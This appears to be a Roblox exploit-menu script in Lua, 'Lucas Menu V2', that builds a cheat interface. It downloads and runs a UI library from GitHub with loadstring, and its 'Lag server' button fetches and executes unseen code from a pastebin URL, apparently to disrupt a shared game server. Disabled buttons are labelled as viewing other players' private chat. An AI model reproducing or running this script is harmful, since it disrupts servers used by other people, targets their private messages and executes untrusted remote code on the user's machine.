local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

OrionLib:MakeNotification({
    Name = "Lucas Menu",
    Content = "Executando.....",
    Image = "rbxassetid://4483345998",
    Time = 5
})


local Window = OrionLib:MakeWindow({Name = "Lucas Menu V2", HidePremium = false, SaveConfig = true, ConfigFolder = "Lucas"})

--Player Tab--

local PlayerTab = Window:MakeTab({
    Name = "Menu",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local PlayerSection = PlayerTab:AddSection({
    Name = "Menu"
})

PlayerSection:AddButton({
    Name = "Lag server",
    Callback = function(value)
    print(loadstring(game:HttpGet("https://pastebin.com/raw/HGBJqVMu",true))())
      end
})

PlayerSection:AddButton({
    Name = "Ver chat privado (off)",
    Callback = function(value)
    print()
      end
})

PlayerSection:AddButton({
    Name = "Ver chat privado 2 (off)",
    Callback = function(value)
    print()
      end
})

